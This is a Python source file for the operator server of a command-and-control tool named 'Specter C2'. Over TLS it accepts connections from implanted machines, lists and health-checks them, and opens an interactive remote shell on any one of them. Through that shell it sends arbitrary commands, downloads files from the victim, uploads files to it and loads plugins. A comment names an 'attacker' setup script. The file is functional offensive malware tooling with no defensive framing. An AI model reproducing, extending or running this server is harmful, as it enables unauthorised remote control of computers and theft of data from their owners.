import os
import re
import ssl
import socket
import threading
import importlib.util

CHUNK_SIZE = 4096

clients = []
loaded_plugins = []


# ── Transfer helpers ──────────────────────────────────────────────────────────

def _recv_line(sock):
    """Read bytes until newline; return decoded string without the newline."""
    buf = b""
    while True:
        byte = sock.recv(1)
        if not byte:
            raise ConnectionError("Socket closed")
        if byte == b"\n":
            return buf.decode()
        buf += byte


def _recv_exact(sock, n):
    """Receive exactly n bytes."""
    buf = b""
    while len(buf) < n:
        data = sock.recv(n - len(buf))
        if not data:
            raise ConnectionError("Socket closed")
        buf += data
    return buf


def _progress(done, total):
    pct = int(done / total * 40)
    print(f"\r  [{'#' * pct}{'.' * (40 - pct)}] {done}/{total} bytes", end="", flush=True)


def download_file(sock, remote_path):
    sock.send(f"SPECTER_DOWNLOAD:{remote_path}".encode())
    response = _recv_line(sock)

    if response.startswith("ERROR:"):
        print(f"[-] {response[6:]}")
        return

    if not response.startswith("SIZE:"):
        print(f"[-] Unexpected response: {response}")
        return

    file_size = int(response[5:])
    filename = os.path.basename(remote_path)
    save_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "downloads")
    os.makedirs(save_dir, exist_ok=True)
    save_path = os.path.join(save_dir, filename)

    print(f"[*] Downloading {filename} ({file_size} bytes)...")
    sock.send(b"ACK\n")

    received = 0
    with open(save_path, "wb") as f:
        while received < file_size:
            chunk = _recv_exact(sock, min(CHUNK_SIZE, file_size - received))
            f.write(chunk)
            received += len(chunk)
            _progress(received, file_size)
            sock.send(b"ACK\n")

    _recv_line(sock)  # consume DONE
    print(f"\n[+] Saved to {save_path}")


def upload_file(sock, local_path, remote_path):
    if not os.path.isfile(local_path):
        print(f"[-] Local file not found: {local_path}")
        return

    file_size = os.path.getsize(local_path)
    sock.send(f"SPECTER_UPLOAD:{remote_path}:{file_size}".encode())

    response = _recv_line(sock)
    if response != "READY":
        print(f"[-] Target not ready: {response}")
        return

    print(f"[*] Uploading {local_path} ({file_size} bytes)...")

    sent = 0
    with open(local_path, "rb") as f:
        while True:
            chunk = f.read(CHUNK_SIZE)
            if not chunk:
                break
            sock.sendall(chunk)
            sent += len(chunk)
            _progress(sent, file_size)
            ack = _recv_line(sock)
            if ack != "ACK":
                print(f"\n[-] Transfer interrupted: {ack}")
                return

    sock.send(b"DONE\n")
    _recv_line(sock)  # consume SAVED
    print(f"\n[+] Uploaded to {remote_path} on target")


# ── C2 core ───────────────────────────────────────────────────────────────────

def handle_connection(server_socket, tls_ctx):
    while True:
        try:
            raw_sock, client_addr = server_socket.accept()
            tls_sock = tls_ctx.wrap_socket(raw_sock, server_side=True)
            print(f"[+] New connection from {client_addr}")
            clients.append((tls_sock, client_addr))
        except ssl.SSLError as e:
            print(f"[!] TLS handshake failed from {client_addr}: {e}")
            raw_sock.close()
        except Exception:
            break


def remove_disconnected_clients():
    global clients
    alive = []
    for sock, addr in clients:
        try:
            sock.send(b"SPECTER_PING")
            sock.settimeout(2)
            response = sock.recv(64).decode().strip()
            sock.settimeout(None)
            if response == "SPECTER_PONG":
                alive.append((sock, addr))
            else:
                raise ConnectionError("bad response")
        except:
            print(f"[!] Removing dead client: {addr}")
            sock.close()
    clients = alive


def client_shell(client_socket, client_addr, idx):
    while True:
        try:
            command = input(f"SPECTER:{client_addr}> ").strip()
            command = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]|\x1b.', '', command).strip()

            if not command:
                continue

            if command.lower() == "exit":
                client_socket.send(b"exit")
                break

            if command.lower() == "back":
                print("[*] Returning to main menu.")
                break

            if command.lower() == "help":
                print("[?] Commands: exit, back, help")
                print("[?]           download <remote_path>")
                print("[?]           upload <local_path> <remote_path>")
                if loaded_plugins:
                    print("[?] Plugins:  " + ", ".join(n for n, _ in loaded_plugins))
                continue

            if command.startswith("download "):
                download_file(client_socket, command[9:].strip())
                continue

            if command.startswith("upload "):
                parts = command[7:].strip().split(" ", 1)
                if len(parts) == 2:
                    upload_file(client_socket, parts[0], parts[1])
                else:
                    print("[?] Usage: upload <local_path> <remote_path>")
                continue

            # Check plugins
            for plugin_name, plugin_func in loaded_plugins:
                if command.lower() == plugin_name:
                    plugin_func(client_socket)
                    break
            else:
                # Normal shell command
                client_socket.send(command.encode())
                output = client_socket.recv(4096).decode()
                print(output)

        except Exception as e:
            print(f"[-] Error with client {idx}: {e}")
            break


def load_plugins():
    plugin_list = []
    plugin_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "plugins")
    for filename in os.listdir(plugin_dir):
        if filename.endswith(".py") and filename != "__init__.py":
            path = os.path.join(plugin_dir, filename)
            name = filename[:-3]
            spec = importlib.util.spec_from_file_location(name, path)
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
            if hasattr(module, "run"):
                plugin_list.append((name, module.run))
                print(f"[+] Loaded plugin: {name}")
    return plugin_list


def start_server(host='0.0.0.0', port=9001):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    cert_path  = os.path.join(script_dir, "cert.pem")
    key_path   = os.path.join(script_dir, "key.pem")

    if not os.path.exists(cert_path) or not os.path.exists(key_path):
        print("[-] TLS certificate not found. Run: python attacker/setup.py")
        return

    tls_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    tls_ctx.load_cert_chain(cert_path, key_path)

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"[+] Specter C2 listening on {host}:{port} (TLS)")

    threading.Thread(target=handle_connection, args=(server_socket, tls_ctx), daemon=True).start()

    global loaded_plugins
    loaded_plugins = load_plugins()

    while True:
        try:
            cmd = input("C2> ").strip()

            if cmd == "list":
                remove_disconnected_clients()
                for idx, (sock, addr) in enumerate(clients):
                    print(f"[{idx}] {addr}")

            elif cmd.startswith("select "):
                try:
                    idx = int(cmd.split()[1])
                    sock, addr = clients[idx]
                    print(f"[+] Shell opened for {addr}")
                    client_shell(sock, addr, idx)
                    remove_disconnected_clients()
                except (IndexError, ValueError):
                    print("[-] Invalid index.")

            elif cmd == "exit":
                print("[*] Shutting down C2 server.")
                for sock, _ in clients:
                    try:
                        sock.send(b"exit")
                        sock.close()
                    except:
                        pass
                break

            else:
                print("[?] Commands: list, select <index>, exit")

        except KeyboardInterrupt:
            print("\n[*] C2 interrupted. Exiting.")
            break


if __name__ == "__main__":
    start_server()
